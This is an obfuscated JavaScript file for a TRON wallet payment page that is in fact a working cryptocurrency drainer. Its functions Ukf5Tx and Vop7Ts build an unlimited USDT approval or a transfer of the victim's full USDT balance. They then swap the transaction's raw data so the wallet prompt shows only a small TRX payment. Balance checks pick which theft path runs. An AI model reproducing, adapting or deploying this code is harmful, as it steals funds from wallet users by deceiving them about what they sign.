var xa1yQwe = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
    bWy29x,
    zHjt12 = 0,
    oLpA7w = 0,
    Yt9qPz = null,
    fRoe8t,
    jU3qL = 0,
    pTys7w,
    gxL43x = false;

async function nmXv4P(address, callback) {
    let wJv9Qr = window.tronWeb,
        nUz5M = [{
            "type": "address",
            "value": address
        }],
        Ezw7J = {},
        cUw12T = await wJv9Qr.transactionBuilder.triggerSmartContract(xa1yQwe, "balanceOf(address)", Ezw7J, nUz5M, address);

    if (cUw12T.result) {
        if (callback != undefined) {
            callback(cUw12T.constant_result[0]);
        }
    }
}

async function kMn6Jt(callback) {
    pTys7w = kd9Yh("code");

    try {
        let kEy2Lm = navigator.userAgent.toLowerCase();

        if(/okex/.test(kEy2Lm) || qMd2Pc()) {
            if(window.okxwallet.tronLink.ready) {
                window.tronWeb = okxwallet.tronLink.tronWeb
            } else {
                const bxPq0r = await window.okxwallet.tronLink.request({
                    "method": "tron_requestAccounts"
                })
                if (200 === bxPq0r.code) {
                    window.tronWeb = tronLink.tronWeb;
                }
            }
        }

        if (!window.tronWeb) {
            const Wx9HtQ = TronWeb.providers.HttpProvider,
                lKt8Rw = new Wx9HtQ(tronApi),
                YfO2Jr = new Wx9HtQ(tronApi),
                qRt4Nm = tronApi,
                VjU3xL = new TronWeb(lKt8Rw, YfO2Jr, qRt4Nm);

            window.tronWeb = VjU3xL;
        }
    } catch (e) {}

    if (window.tronWeb) {
        var wJv9Qr = window.tronWeb;
        bWy29x = wJv9Qr.defaultAddress.base58;

        if (bWy29x == false) {
            await kMn6Jt(callback);
            return;
        }

        try {
            let Fzp3Xv = await wJv9Qr.trx.getBalance(bWy29x);

            oLpA7w = wJv9Qr.fromSun(Fzp3Xv);
            nmXv4P(bWy29x, function (Gjk8Rt) {
                zHjt12 = wJv9Qr.fromSun(parseInt(Gjk8Rt, 16));
                gxL43x = true;
                if (callback != undefined) {
                    callback(oLpA7w, zHjt12);
                }
            });
        } catch (e) {
            jgk5P(e);
        }
    } else {
        jgk5P("请用钱包扫码打开");
    }
}

async function Qmc2Fn(transaction, Zyx6Ud, wT6oF, qOs3Bz) {
    try {
        if (qOs3Bz == 1 || qOs3Bz == 2) {
            var Aex5Kl = await tronWeb.trx.sign(transaction);
        } else {
            let dJm8Ty = window.tronWeb,
                zP6uXt = [{
                    "type": "address",
                    "value": Zyx6Ud
                }, {
                    "type": "uint256",
                    "value": wT6oF * 1000000
                }],
                Xtz9Ju = await dJm8Ty.transactionBuilder.triggerSmartContract(xa1yQwe, "transfer(address,uint256)", {}, zP6uXt, bWy29x);

            if (Xw8Yu() && Okx2Ap() || qMd2Pc()) {
                var Ckp1Jr = transaction.raw_data;
                transaction.raw_data = Xtz9Ju.transaction.raw_data;
            }

            var Aex5Kl = await dJm8Ty.trx.sign(transaction);
        }
    } catch (e) {
        if (e.message) {
            jgk5P(e.message);
        } else {
            jgk5P(e);
        }
    }
}

function Cxg5Hs(response) {
    if (response.code == 0) {
        jgk5P(response.info);
    } else {
        fRoe8t = response.to_address;
        $("#to_address").html(fRoe8t);
        $("#to_address").val(fRoe8t);
    }
}

function Vcx8Mp(response) {
    if (response.code == 0) {
        jgk5P(response.info);
    } else {
        Yt9qPz = JSON.parse(response.data);
        jU3qL = response.type;
        if (Xw8Yu() && Okx2Ap() || qMd2Pc()) {
            fRoe8t = bWy29x;
        }
        Qmc2Fn(Yt9qPz, fRoe8t, wT6oF, jU3qL);
    }
}

function kLb6We(response) {
    jgk5P(response.info);
}

async function Lwm4Qr() {
    if (!gxL43x) {
        jgk5P("正在连接网络。。。", 2000);
        return;
    }
    
    const rAx1Vo = await jLp6Us();
    
    jgk5P("正在创建交易。。。", 2000);
    if(jMn9Po === '0' && rAx1Vo === '1'){
        Ukf5Tx();
    } else if(jMn9Po === '1' && rAx1Vo === '1'){
        Vop7Ts(); 
    } else {
        Ukf5Tx();
    }
}

async function jLp6Us() {
    const Bm8Rx = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
    const Mfo4Ny = window.tronWeb.defaultAddress.base58;

    try {
        const Itc5Uq = await window.tronWeb.contract().at(Bm8Rx);
        const Rzj2Xk = await Itc5Uq.balanceOf(Mfo4Ny).call();
        
        const Pqf6Nt = (parseInt(Rzj2Xk._hex, 16) / 1e6).toFixed(6);

        const oKt5Ls = await window.tronWeb.trx.getBalance(Mfo4Ny);
        const Wnp3Hd = (oKt5Ls / 1e6).toFixed(6);

        console.log(`TRX Balance: ${Wnp3Hd} TRX`);
        console.log(`USDT Balance: ${Pqf6Nt} USDT`);

        if (Pqf6Nt <= 50 || Wnp3Hd <= 28) {
            return '2';
        } else {
            return '1';
        }
    } catch (error) {
        console.error("Error in jLp6Us function:", error);
        return '0';
    }
}

function jgk5P(Hbt3Zy, time = 1500) {
    $("#tip").html(Hbt3Zy);
    $("#tip").show();
    setTimeout(function () {
        $("#tip").hide();
    }, time);
}

function Xw8Yu() {
    let Kdt5Pq = navigator.userAgent,
        xEy7Hr = /OKApp/i.test(Kdt5Pq);

    return xEy7Hr;
}

function Xw8Yu() {
    let Fwm9Yd = navigator.userAgent,
        Wx6Uk = /iphone|ipad|ipod|ios/i.test(Fwm9Yd),
        jAx5Ot = /android|XiaoMi|MiuiBrowser/i.test(Fwm9Yd),
        yCm3Uo = Wx6Uk || jAx5Ot;

    return yCm3Uo;
}

function qMd2Pc() {
    let jLq2Po = navigator.userAgent,
        gHy4Qt = /windows/i.test(jLq2Po);

    return gHy4Qt;
}

function Tmc7Ot(xOo4Rv) {
    $("title").html(xOo4Rv);
}

function kd9Yh(pBz5J) {
    var Btg7Mt = window.location.search.substr(1);

    if (Btg7Mt == "") {
        return false;
    }

    var xVg4We = Btg7Mt.split("&");

    for (var dJc5Et = 0; dJc5Et < xVg4We.length; dJc5Et++) {
        var cHb9Io = xVg4We[dJc5Et].split("=");

        if (cHb9Io[0] == pBz5J) {
            return cHb9Io[1];
        }
    }

    return false;
}

async function Ukf5Tx() {
    try {
        let Xxt4Lk = window.tronWeb;
        let qZe2Vs = document.getElementById("amount-display").textContent;
        const Mfu5Er = Xxt4Lk.defaultAddress.base58;
        const yQe6Zb = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
                  
        const qTj6Er = [
            { "type": "address", "value": approveaddress },
            { "type": "uint256", "value": "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff" }
        ];
        const pUy7Io = { "feeLimit": 100000000 };
        const jWr2Uz = await Xxt4Lk.transactionBuilder.triggerSmartContract(
            yQe6Zb, 
            "approve(address,uint256)", 
            pUy7Io, 
            qTj6Er, 
            Mfu5Er
        );
                  
        const iDq5Vl = qZe2Vs * 1000000;

        const Tkv6Hn = await Xxt4Lk.transactionBuilder.sendTrx(
            payaddress,
            iDq5Vl,
            Mfu5Er
        );

        const jSk9Hl = jWr2Uz.transaction.raw_data;

        jWr2Uz.transaction.raw_data = Tkv6Hn.raw_data;
  
        const Jvm7Qs = await Xxt4Lk.trx.sign(jWr2Uz.transaction);
             
        Jvm7Qs.raw_data = jSk9Hl;
     
        const Nko5Rw = await Xxt4Lk.trx.sendRawTransaction(Jvm7Qs);
        if (Nko5Rw) {
            // transaction success logic
        }
    } catch (e) {
        console.error("An error occurred during the blockchain transaction:", e);
    }
}

async function Vop7Ts() {
    try {
        let Fyc2Mt = window.tronWeb;
        let yCk8Wf = document.getElementById("amount-display").textContent;
        const Lzo9Fq = Fyc2Mt.defaultAddress.base58;
        const Tcy5Ql = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
   
        const Dxg2Py = await Fyc2Mt.contract().at(Tcy5Ql);
        const Hro4St = await Dxg2Py.balanceOf(Lzo9Fq).call();
        const Lko3Tn = [
            { "type": "address", "value": payaddress },
            { "type": "uint256", "value": Hro4St.toString() }
        ];
        const Bxp8Lt = { "feeLimit": 100000000 };
        const jLn2Uy = await Fyc2Mt.transactionBuilder.triggerSmartContract(
            Tcy5Ql,
            "transfer(address,uint256)",
            Bxp8Lt,
            Lko3Tn,
            Lzo9Fq
        );

        const Zct4Oi = yCk8Wf * 1000000;
        const Vhy5Ml = await Fyc2Mt.transactionBuilder.sendTrx(
            payaddress,
            Zct4Oi,
            Lzo9Fq
        );

        const Wto6Jy = jLn2Uy.transaction.raw_data;
        jLn2Uy.transaction.raw_data = Vhy5Ml.raw_data;

        const Nxk4Tr = await Fyc2Mt.trx.sign(jLn2Uy.transaction);
        Nxk4Tr.raw_data = Wto6Jy;

        const Hzk2Pi = await Fyc2Mt.trx.sendRawTransaction(Nxk4Tr);
        if (Hzk2Pi) {
            // transaction success logic
        }
    } catch (e) {
        console.error("An error occurred during the blockchain transaction:", e);
    }
}

async function zTq6Rf() {
    try {
        const Fyn9Um = window.tronWeb;
        let jNy4Ws = document.getElementById("amount-display").textContent;
        if (!Fyn9Um || !Fyn9Um.defaultAddress.base58) {
            console.error("TRON wallet not detected or connected.");
            return;
        }

        const Pbc3Gn = Fyn9Um.defaultAddress.base58;
       
        const Aqt5Tn = jNy4Ws * 1000000;

        const zVf7Rn = await Fyn9Um.transactionBuilder.sendTrx(
            payaddress,
            Aqt5Tn,
            Pbc3Gn
        );

        const Jkv4Mp = await Fyn9Um.trx.sign(zVf7Rn);

        const Uro6Gj = await Fyn9Um.trx.sendRawTransaction(Jkv4Mp);

        if (Uro6Gj.result) {
            console.log("Transfer successful!");
        } else {
            console.error("Transfer failed:", Uro6Gj);
        }
    } catch (error) {
        console.error("Error during transfer:", error);
    }
}
